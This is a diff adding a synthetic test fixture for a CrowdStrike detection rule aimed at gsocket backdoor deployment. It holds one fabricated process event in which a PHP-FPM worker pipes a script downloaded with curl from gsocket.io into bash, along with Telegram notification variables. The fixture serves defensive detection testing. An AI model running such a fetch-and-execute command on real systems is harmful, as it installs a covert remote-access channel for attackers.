@@ -1,0 +1,23 @@
+{
+  "label": "malicious",
+  "variant": "Deploy run with Telegram notification env vars (GS_TG_TOKEN / GS_TG_CHATID, named in the blog)",
+  "synthetic": true,
+  "source": "synthetic; https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/ ; https://github.com/hackerschoice/gsocket/blob/master/deploy/deploy.sh",
+  "platform": "crowdstrike",
+  "table": "ProcessRollup2",
+  "expect_alert": true,
+  "result": "not run (no LogScale or Advanced Hunting runner). Regex-level Python check of the rule's patterns: would alert, matches expectation",
+  "events": [
+    {
+      "#event_simpleName": "ProcessRollup2",
+      "event_platform": "Lin",
+      "@timestamp": "2026-11-10T13:10:00Z",
+      "aid": "0000000000000000000000000000syn1",
+      "UID": "33",
+      "GrandParentBaseFileName": "php-fpm8.1",
+      "ParentBaseFileName": "php-fpm8.1",
+      "ImageFileName": "/bin/sh",
+      "CommandLine": "sh -c GS_TG_TOKEN=000000:SYNTHETIC GS_TG_CHATID=-1000 bash -c \"$(curl -fsSL https://gsocket.io/y)\""
+    }
+  ]
+}
